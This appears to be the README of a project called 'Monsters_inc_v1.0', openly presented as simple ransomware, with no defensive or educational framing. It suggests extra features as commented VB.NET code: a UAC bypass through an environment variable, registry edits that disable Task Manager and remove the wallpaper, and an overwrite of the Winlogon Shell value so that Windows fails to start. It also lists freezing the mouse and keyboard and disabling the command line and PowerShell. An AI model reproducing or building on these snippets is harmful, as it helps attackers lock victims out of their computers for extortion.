# Monsters_inc_v1.0<br>
Simple ransomware ..<br>
You can develop the ransomware by adding some features such as :<br><br>

        'Bypass UAC
        'Process.Start("cmd", "/c SET __COMPAT_LAYER=RunAsInvoker")
        'Disable taskmanager
        'My.Computer.Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System")
        'My.Computer.Registry.SetValue("DisableTaskMgr", 1, RegistryValueKind.String)
        'Remove wallpaper desktop
        'My.Computer.Registry.CurrentUser.CreateSubKey("Control Panel\\Desktop")
        'My.Computer.Registry.SetValue("Wallpaper", "", RegistryValueKind.String)
        'If you shutdown your computer, you cant run winodws well
        'My.Computer.Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon")
        'My.Computer.Registry.SetValue("Shell", "empty", RegistryValueKind.String)

        'Frazee mouse/keyboard + kill proccess + disable command line&Powershell

Video : https://youtu.be/DO442auD2ic<br>
Twitter : https://twitter.com/0xHunter
